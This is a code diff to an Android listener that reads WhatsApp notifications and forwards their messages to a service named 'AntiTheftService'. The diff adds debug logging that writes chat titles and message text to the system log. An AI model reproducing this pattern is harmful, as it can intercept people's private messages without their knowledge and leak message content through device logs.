@@ -27,8 +27,15 @@ class WhatsAppNotificationListener : NotificationListenerService() {
         val extras = notification.extras ?: return
         val baseTimestamp = sbn.postTime
 
+        val title = extras.getString(Notification.EXTRA_TITLE)?.take(40) ?: ""
+        val summary = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.take(60) ?: ""
+        Log.d("WhatsAppListener", "onNotificationPosted pkg=${sbn.packageName} title='$title' summary='$summary'")
+
         val messages = extractMessages(extras, baseTimestamp)
-        if (messages.isEmpty()) return
+        if (messages.isEmpty()) {
+            Log.d("WhatsAppListener", "No messages extracted from notification")
+            return
+        }
 
         messages.firstOrNull()?.address?.takeIf { it.isNotBlank() }?.let {
             lastAddress = it
@@ -180,13 +187,16 @@ class WhatsAppNotificationListener : NotificationListenerService() {
     private fun sendWhatsAppMessage(msg: WhatsMessage) {
         try {
             val cleanName = normalizeChatName(msg.address)
-            if (cleanName.isBlank()) return
+            if (cleanName.isBlank()) {
+                Log.w("WhatsAppListener", "Skipping message: blank chat name for content='${msg.content.take(40)}'")
+                return
+            }
             val address = Json.encodeToString(String.serializer(), cleanName)
             val name = Json.encodeToString(String.serializer(), cleanName)
             val content = Json.encodeToString(String.serializer(), msg.content)
             val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$address,"name":$name,"content":$content,"timestamp":${msg.timestamp}}"""
             val sent = AntiTheftService.sendRawMessage(payload)
-            Log.d("WhatsAppListener", "forwarded message to $cleanName: $sent")
+            Log.d("WhatsAppListener", "forwarded message to $cleanName sent=$sent content='${msg.content.take(40)}'")
         } catch (e: Exception) {
             Log.e("WhatsAppListener", "Failed to forward message: ${e.message}")
         }
